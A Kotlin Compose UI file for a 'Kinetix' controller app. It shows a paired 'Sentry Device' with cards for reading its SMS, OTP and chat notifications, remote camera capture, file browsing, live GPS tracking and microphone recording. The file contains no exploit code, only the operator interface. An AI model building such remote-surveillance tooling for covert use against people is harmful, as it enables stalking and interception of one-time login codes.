package com.example.kinetix.ui.devicedetail

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DeviceDetailScreen(
    deviceId: String,
    onBack: () -> Unit,
    onNavigateToNotifications: () -> Unit,
    onNavigateToPhotos: () -> Unit,
    onNavigateToFiles: () -> Unit,
    onNavigateToLocation: () -> Unit,
    onNavigateToBattery: () -> Unit,
    onNavigateToAudio: () -> Unit,
    onUnpaired: () -> Unit
) {
    val context = LocalContext.current
    val clipboardManager = LocalClipboardManager.current
    val coroutineScope = rememberCoroutineScope()
    var deviceName by remember { mutableStateOf("Sentry Device") }
    var osVersion by remember { mutableStateOf("Android 16") }
    var isOnline by remember { mutableStateOf(true) }
    var cameraEnabled by remember { mutableStateOf(true) }
    var locationEnabled by remember { mutableStateOf(true) }
    var notificationEnabled by remember { mutableStateOf(true) }
    var micEnabled by remember { mutableStateOf(true) }
    var filesEnabled by remember { mutableStateOf(true) }
    var batteryEnabled by remember { mutableStateOf(true) }
    var showInfoModal by remember { mutableStateOf(false) }
    var actionMessage by remember { mutableStateOf<String?>(null) }

    LaunchedEffect(deviceId) {
        withContext(Dispatchers.IO) {
            val client = com.example.kinetix.network.KinetixApiClient(context)
            val res = client.listAvailableDevices()
            if (res.isSuccess) {
                val arr = res.getOrNull()
                if (arr != null) {
                    for (i in 0 until arr.length()) {
                        val item = arr.getJSONObject(i)
                        val id = item.optString("deviceId", item.optString("device_id", ""))
                        if (id == deviceId) {
                            deviceName = item.optString("deviceName", item.optString("device_name", "Sentry Device"))
                            osVersion = item.optString("osVersion", item.optString("os_version", "Android 16"))
                            isOnline = item.optString("status", "ONLINE") == "ONLINE"
                            val caps = item.optJSONObject("capabilities")
                            if (caps != null) {
                                cameraEnabled = caps.optBoolean("camera", true)
                                locationEnabled = caps.optBoolean("location", true)
                                notificationEnabled = caps.optBoolean("notifications", true)
                                micEnabled = caps.optBoolean("microphone", true)
                                filesEnabled = caps.optBoolean("files", true)
                                batteryEnabled = caps.optBoolean("battery", true)
                            }
                            break
                        }
                    }
                }
            }
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text(
                            text = deviceName,
                            fontWeight = FontWeight.ExtraBold,
                            fontSize = 19.sp,
                            maxLines = 1
                        )
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.padding(top = 2.dp)) {
                            Box(
                                modifier = Modifier
                                    .size(8.dp)
                                    .clip(CircleShape)
                                    .background(if (isOnline) Color(0xFF4CAF50) else Color(0xFFE53935))
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = if (isOnline) "Connected • Online" else "Offline",
                                fontSize = 12.sp,
                                color = if (isOnline) Color(0xFF2E7D32) else Color(0xFFC62828),
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                actions = {
                    // Top (i) Information Button
                    IconButton(onClick = { showInfoModal = true }) {
                        Surface(
                            shape = CircleShape,
                            color = MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.5f),
                            modifier = Modifier.size(36.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    Icons.Default.Info,
                                    contentDescription = "Device Information",
                                    tint = MaterialTheme.colorScheme.primary,
                                    modifier = Modifier.size(20.dp)
                                )
                            }
                        }
                    }
                }
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 16.dp)
                .verticalScroll(rememberScrollState())
        ) {
            // Action feedback banner
            AnimatedVisibility(visible = actionMessage != null, enter = fadeIn(), exit = fadeOut()) {
                Surface(
                    color = Color(0xFF1E1E1E),
                    shape = RoundedCornerShape(12.dp),
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(vertical = 8.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(horizontal = 14.dp, vertical = 10.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF4CAF50), modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(actionMessage ?: "", color = Color.White, fontSize = 13.sp, fontWeight = FontWeight.SemiBold)
                    }
                }
            }

            Spacer(modifier = Modifier.height(10.dp))

            // Section Header
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "Live Access & Remote Tools",
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.ExtraBold,
                    fontSize = 17.sp
                )
                Surface(
                    shape = RoundedCornerShape(12.dp),
                    color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                ) {
                    Text(
                        text = "6 Features Ready",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                    )
                }
            }

            Spacer(modifier = Modifier.height(14.dp))

            // Grid of 6 interactive Feature Access Cards opening dedicated pages
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                ModernFeatureCard(
                    modifier = Modifier.weight(1f),
                    title = "Live Notifications",
                    subtitle = "Read SMS, OTP & Chat",
                    icon = Icons.Default.NotificationsActive,
                    badgeColor = Color(0xFF1976D2),
                    onClick = onNavigateToNotifications
                )
                ModernFeatureCard(
                    modifier = Modifier.weight(1f),
                    title = "Photos & Camera",
                    subtitle = "Remote Capture & Gallery",
                    icon = Icons.Default.PhotoCamera,
                    badgeColor = Color(0xFF7B1FA2),
                    onClick = onNavigateToPhotos
                )
            }

            Spacer(modifier = Modifier.height(12.dp))

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                ModernFeatureCard(
                    modifier = Modifier.weight(1f),
                    title = "File Explorer",
                    subtitle = "Browse Internal Storage",
                    icon = Icons.Default.FolderOpen,
                    badgeColor = Color(0xFFF57C00),
                    onClick = onNavigateToFiles
                )
                ModernFeatureCard(
                    modifier = Modifier.weight(1f),
                    title = "Live Location",
                    subtitle = "GPS Satellite Tracker",
                    icon = Icons.Default.MyLocation,
                    badgeColor = Color(0xFF388E3C),
                    onClick = onNavigateToLocation
                )
            }

            Spacer(modifier = Modifier.height(12.dp))

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                ModernFeatureCard(
                    modifier = Modifier.weight(1f),
                    title = "Battery & Health",
                    subtitle = "Charge Level & Temp",
                    icon = Icons.Default.BatteryChargingFull,
                    badgeColor = Color(0xFF00796B),
                    onClick = onNavigateToBattery
                )
                ModernFeatureCard(
                    modifier = Modifier.weight(1f),
                    title = "Mic & Audio",
                    subtitle = "Remote Voice Memo",
                    icon = Icons.Default.Mic,
                    badgeColor = Color(0xFFC2185B),
                    onClick = onNavigateToAudio
                )
            }

            Spacer(modifier = Modifier.height(24.dp))

            // Quick Device Command Actions
            Text(
                text = "Quick Device Actions",
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.ExtraBold,
                fontSize = 17.sp
            )

            Spacer(modifier = Modifier.height(12.dp))

            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(20.dp),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.35f)
                )
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    // Play Sound / Ring
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clickable {
                                actionMessage = "Sent Ring Command to $deviceName"
                                coroutineScope.launch {
                                    delay(2500)
                                    actionMessage = null
                                }
                            }
                            .padding(vertical = 8.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(38.dp)
                                .clip(RoundedCornerShape(10.dp))
                                .background(Color(0xFF276EF1).copy(alpha = 0.15f)),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(Icons.Default.VolumeUp, contentDescription = null, tint = Color(0xFF276EF1), modifier = Modifier.size(22.dp))
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Ring Device at Max Volume", fontWeight = FontWeight.Bold, fontSize = 14.sp)
                            Text("Plays loud alert sound even if on silent mode", fontSize = 12.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
                        }
                        Icon(Icons.Default.ChevronRight, contentDescription = null, tint = MaterialTheme.colorScheme.outline)
                    }

                    HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.4f))

                    // Unpair / Disconnect Device
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clickable { onUnpaired() }
                            .padding(vertical = 8.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(38.dp)
                                .clip(RoundedCornerShape(10.dp))
                                .background(MaterialTheme.colorScheme.error.copy(alpha = 0.15f)),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(Icons.Default.LinkOff, contentDescription = null, tint = MaterialTheme.colorScheme.error, modifier = Modifier.size(22.dp))
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text("Unpair Device", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = MaterialTheme.colorScheme.error)
                            Text("Remove Sentry pairing and encryption keys", fontSize = 12.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
                        }
                        Icon(Icons.Default.ChevronRight, contentDescription = null, tint = MaterialTheme.colorScheme.outline)
                    }
                }
            }

            Spacer(modifier = Modifier.height(28.dp))
        }
    }

    // Modal Bottom Sheet / Dialog showing Device Information & Capabilities (Triggered by (i) button)
    if (showInfoModal) {
        ModalBottomSheet(
            onDismissRequest = { showInfoModal = false },
            shape = RoundedCornerShape(topStart = 28.dp, topEnd = 28.dp),
            containerColor = MaterialTheme.colorScheme.surface
        ) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 24.dp, vertical = 8.dp)
                    .padding(bottom = 32.dp)
                    .verticalScroll(rememberScrollState())
            ) {
                // Header
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "Device Information",
                        style = MaterialTheme.typography.titleLarge,
                        fontWeight = FontWeight.ExtraBold
                    )
                    Surface(
                        shape = RoundedCornerShape(8.dp),
                        color = if (isOnline) Color(0xFFE8F5E9) else Color(0xFFFFEBEE)
                    ) {
                        Text(
                            text = if (isOnline) "• ONLINE" else "• OFFLINE",
                            color = if (isOnline) Color(0xFF2E7D32) else Color(0xFFC62828),
                            fontWeight = FontWeight.Bold,
                            fontSize = 11.sp,
                            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                        )
                    }
                }

                Spacer(modifier = Modifier.height(16.dp))

                // Device Identity Details Card
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(18.dp),
                    colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                    )
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text(
                            text = deviceName,
                            fontWeight = FontWeight.ExtraBold,
                            fontSize = 17.sp
                        )

                        Spacer(modifier = Modifier.height(6.dp))

                        // Device ID with Copy Button
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable {
                                    clipboardManager.setText(AnnotatedString(deviceId))
                                    actionMessage = "Device ID copied to clipboard"
                                    coroutineScope.launch {
                                        delay(2000)
                                        actionMessage = null
                                    }
                                },
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = deviceId,
                                fontFamily = FontFamily.Monospace,
                                fontSize = 13.sp,
                                fontWeight = FontWeight.Bold,
                                color = MaterialTheme.colorScheme.primary
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Icon(Icons.Default.ContentCopy, contentDescription = "Copy ID", tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(14.dp))
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        Text(
                            text = "Platform: Android • OS: $osVersion • Sentry: 1.0.0",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }

                Spacer(modifier = Modifier.height(20.dp))

                // Capabilities & Permissions Checklist
                Text(
                    text = "Capabilities & Permissions",
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.ExtraBold
                )

                Spacer(modifier = Modifier.height(10.dp))

                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(18.dp),
                    colors = CardDefaults.cardColors(
                        containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.35f)
                    )
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        CapabilityRow(name = "Camera & Photos", isEnabled = cameraEnabled, icon = Icons.Default.CameraAlt)
                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                        CapabilityRow(name = "Files & Storage", isEnabled = filesEnabled, icon = Icons.Default.Folder)
                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                        CapabilityRow(name = "Live Notifications", isEnabled = notificationEnabled, icon = Icons.Default.Notifications)
                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                        CapabilityRow(name = "GPS Location", isEnabled = locationEnabled, icon = Icons.Default.LocationOn)
                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                        CapabilityRow(name = "Microphone Audio", isEnabled = micEnabled, icon = Icons.Default.Mic)
                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp), color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.3f))
                        CapabilityRow(name = "Battery & Health", isEnabled = batteryEnabled, icon = Icons.Default.BatteryFull)
                    }
                }

                Spacer(modifier = Modifier.height(20.dp))

                Button(
                    onClick = { showInfoModal = false },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(14.dp)
                ) {
                    Text("Close", fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}

@Composable
fun ModernFeatureCard(
    modifier: Modifier = Modifier,
    title: String,
    subtitle: String,
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    badgeColor: Color,
    onClick: () -> Unit
) {
    Card(
        onClick = onClick,
        modifier = modifier,
        shape = RoundedCornerShape(20.dp),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.50f)
        ),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp)
        ) {
            Box(
                modifier = Modifier
                    .size(44.dp)
                    .clip(RoundedCornerShape(12.dp))
                    .background(badgeColor.copy(alpha = 0.15f)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    icon,
                    contentDescription = null,
                    tint = badgeColor,
                    modifier = Modifier.size(24.dp)
                )
            }
            Spacer(modifier = Modifier.height(14.dp))
            Text(
                text = title,
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.Bold,
                fontSize = 15.sp
            )
            Spacer(modifier = Modifier.height(3.dp))
            Text(
                text = subtitle,
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
                lineHeight = 16.sp
            )
        }
    }
}

@Composable
fun CapabilityRow(name: String, isEnabled: Boolean, icon: androidx.compose.ui.graphics.vector.ImageVector) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Icon(
                icon,
                contentDescription = null,
                tint = MaterialTheme.colorScheme.primary,
                modifier = Modifier.size(20.dp)
            )
            Spacer(modifier = Modifier.width(12.dp))
            Text(text = name, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Medium)
        }

        Surface(
            shape = RoundedCornerShape(8.dp),
            color = if (isEnabled) Color(0xFFE8F5E9) else Color(0xFFFFEBEE)
        ) {
            Text(
                text = if (isEnabled) "Enabled" else "Disabled",
                color = if (isEnabled) Color(0xFF2E7D32) else Color(0xFFC62828),
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp)
            )
        }
    }
}
